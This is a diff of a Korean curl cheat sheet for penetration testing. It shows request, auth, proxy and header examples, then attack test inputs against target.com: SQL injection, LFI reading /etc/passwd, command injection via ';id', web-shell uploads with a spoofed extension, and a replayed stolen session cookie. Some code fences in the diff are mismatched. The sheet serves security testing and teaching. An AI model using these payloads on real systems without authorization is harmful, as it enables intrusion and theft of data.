@@ -1,110 +1,88 @@
-### 기본 요청
+# curl - HTTP 요청 도구
 
--v 옵션은 항상 기본으로 사용하기
-
-```bash
-# 기본 GET 요청
-curl http://target.com
-
-# 응답을 파일로 저장
-curl -o output.html http://target.com
-
-# 조용히 응답 받기 (진행률 표시 없음)
-curl -s http://target.com
-
-# 리다이렉션 자동 따라가기
-curl -L http://target.com
-```
-
-### 디버깅 및 정보 수집
+## 기본 요청
 
 ```bash
-# 헤더 정보 포함 (-i) 또는 헤더만 표시 (-I)
-curl -i http://target.com
-curl -I http://target.com
-
-# 상세 디버깅 정보 (요청/응답 헤더 등)
-curl -v http://target.com
+curl http://target.com                # 기본 GET 요청 (출력: 터미널)
+curl -o file.html http://target.com   # 파일로 저장
+curl -s http://target.com             # 진행 바 숨김
+curl -L http://target.com             # 리다이렉트 따라가기
 ```
 
-### 인증 및 세션
+## 디버깅/분석
 
 ```bash
-# 기본 인증
-curl -u username:password http://target.com
-
-# Bearer 토큰 인증
-curl -H "Authorization: Bearer TOKEN" http://target.com
-
-# 쿠키 저장 (-c)
-curl -c cookies.txt http://target.com
-
-# 쿠키 사용 (-b)
-curl -b cookies.txt http://target.com
-
-# 쿠키 저장 및 사용 동시에 (세션 유지)
-curl -b cookies.txt -c cookies.txt http://target.com
+curl -v http://target.com             # 모든 요청/응답 상세 표시 (필수)
+curl -I http://target.com             # 헤더만 요청 (HEAD 메소드)
+curl -i http://target.com             # 응답 본문과 헤더 함께 표시
 ```
 
-### 데이터 전송
+## 인증
 
 ```bash
-# POST 요청
-curl -X POST -d "param1=value1&param2=value2" http://target.com
+curl -u user:pass http://target.com   # 기본 인증
+curl -H "Authorization: Bearer eyJh..." http://target.com  # JWT/토큰
 
-# 폼 데이터로 POST 요청
-curl -X POST -F "name=user" -F "profile=@shell.php" http://target.com/upload
-
-# JSON 데이터 전송
-curl -X POST -H "Content-Type: application/json" -d '{"key":"value"}' http://target.com
-
-# Content-Type 헤더 설정
-curl -H "Content-Type: application/x-www-form-urlencoded" -d "param=value" http://target.com
+# 쿠키 관련
+curl -c cookies.txt http://target.com        # 쿠키 저장
+curl -b cookies.txt http://target.com        # 저장된 쿠키 사용
+curl -b cookies.txt -c cookies.txt http://target.com  # 세션 유지
 ```
 
-### 헤더 조작
+## 데이터 전송
 
 ```bash
-# 사용자 정의 헤더 추가
-curl -H "User-Agent: Mozilla/5.0" http://target.com
+# POST 요청 (폼)
+curl -X POST -d "user=admin&pass=secret" http://target.com/login.php
 
-# 여러 헤더 추가
-curl -H "X-Forwarded-For: 127.0.0.1" -H "Referer: http://google.com" http://target.com
+# 파일 업로드
+curl -F "file=@shell.php" -F "description=profile" http://target.com/upload.php
+
+# JSON 전송
+curl -X POST -H "Content-Type: application/json" \
+    -d '{"username":"admin","password":"s3cr3t"}' \
+    http://target.com/api/login
 ```
 
-### SSL/프록시 관련
+## 헤더 조작
 
 ```bash
-# SSL 인증서 검증 무시 (보안 경고 무시)
-curl -k https://target.com
+# 사용자 에이전트 변경
+curl -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" http://target.com
 
-# Burp Suite나 다른 프록시 사용
-curl -x http://127.0.0.1:8080 http://target.com
-
-# SOCKS 프록시 사용 (Tor 등)
-curl --socks5 127.0.0.1:9050 http://target.com
+# IP 스푸핑 시도
+curl -H "X-Forwarded-For: 127.0.0.1" http://target.com
+curl -H "X-Real-IP: 127.0.0.1" http://target.com
 ```
 
-## 침투 테스트 실전 예시
+## 보안/프록시
 
-### 웹 취약점 테스트
+```bash
+curl -k https://target.com                       # SSL 인증서 검증 무시
+curl -x http://127.0.0.1:8080 http://target.com  # HTTP 프록시 (Burp)
+curl --socks5 127.0.0.1:9050 http://target.com   # SOCKS5 프록시 (Tor)
+```
+
+## 취약점 테스트
 
 ```bash
 # SQL 인젝션
-curl "http://target.com/page.php?id=1' OR 1=1--"
+curl "http://target.com/search.php?id=1 OR 1=1--"
 
-# XSS 테스트
-curl "http://target.com/search?q=<script>alert(1)</script>"
+# LFI
+curl "http://target.com/page.php?file=../../../etc/passwd"
 
 # 명령어 인젝션
-curl -X POST "http://target.com/execute?cmd=cat+/etc/passwd"
+curl "http://target.com/ping.php?host=127.0.0.1;id"
+```
 
 # 파일 업로드 취약점 (확장자 우회)
+
 curl -X POST -F "file=@webshell.php;filename=image.jpg;type=image/jpeg" http://target.com/upload
 curl -F "file=@/경로/파일명" http://타겟IP/upload.php
 `@`는 curl에서 파일 업로드할 때 로컬 파일임을 나타내는 표시입니다. `-F` 옵션과 함께 사용합니다.
 
-```
+````
 
 ### 인증 우회 및 세션 작업
 
@@ -118,7 +96,7 @@ curl -b "sessionid=STOLEN_SESSION_VALUE" http://target.com/admin
 
 # HTTP 기본 인증 테스트
 curl -u admin:password http://target.com/admin
-```
+````
 
 ### 유용한 도구 조합
 
